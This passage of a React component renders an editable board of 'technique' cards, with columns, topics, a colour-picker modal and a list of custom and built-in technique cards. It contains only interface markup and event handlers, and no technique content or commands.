                  <button onClick={() => handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"><X className="w-3 h-3" /></button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode title={node.title} subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle} accentColor={color} onClick={() => scrollTo(node.id)} small />
                      </div>
                      <button onClick={() => handleDeleteTopic(i, j)} className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3" /></button>
                    </div>
                  ))}
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input type="text" value={topicTitle} onChange={e => setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => { if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <input type="text" value={topicTags} onChange={e => setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500" onKeyDown={e => { if (e.key === 'Enter') handleAddTopic(i); if (e.key === 'Escape') { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); } }} />
                      <div className="flex gap-1">
                        <button onClick={() => handleAddTopic(i)} className="flex-1 px-2 py-1 bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-mono rounded transition-colors">Add</button>
                        <button onClick={() => { setAddingTopicCol(null); setTopicTitle(''); setTopicTags(''); }} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors">Cancel</button>
                      </div>
                    </div>
                  ) : (
                    <button onClick={() => setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors">+ Add Topic</button>
                  )}
                </div>
              </div>
            );
          })}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all">
              <Plus className="w-6 h-6 text-slate-500" /><span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input type="text" value={columnName} onChange={e => setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500" autoFocus onKeyDown={e => e.key === 'Enter' && handleNameSubmit()} />
                <div className="flex gap-2">
                  <button onClick={() => setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Cancel</button>
                  <button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 transition-colors font-mono text-sm font-semibold">Next</button>
                </div>
              </div>
            )}
            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map(option => (
                    <button key={option.value} onClick={() => setSelectedColor(option.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${selectedColor === option.value ? `${colorPreview[option.value]} text-slate-900` : 'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}>
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />{option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button onClick={() => setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm">Back</button>
                  <button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 transition-colors font-mono text-sm font-semibold">Create</button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1"><Plus className="w-3 h-3" /> Add Technique</button>
      </div>

      {customCards.length > 0 && (
        <div className="border-t border-slate-800/50 pt-8">
          <h2 className="text-xl font-bold font-mono text-slate-200 mb-4">Custom Techniques</h2>
          <div className="grid grid-cols-1 gap-4">
            {customCards.map(card => (
              <div key={card.id} className="relative">
                <TechniqueCard title={card.title} subtitle={card.subtitle} tags={card.tags} accentColor={card.accentColor} overview={card.overview} steps={card.steps} commands={card.commands} />
                <button onClick={() => handleDeleteCard(card.id)} className="absolute top-4 right-4 text-slate-600 hover:text-red-400 transition-colors p-1 z-10"><X className="w-4 h-4" /></button>
              </div>
            ))}
          </div>
        </div>
      )}

      <AddCardModal isOpen={cardModalOpen} onClose={() => setCardModalOpen(false)} onSubmit={handleAddCard} />

      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}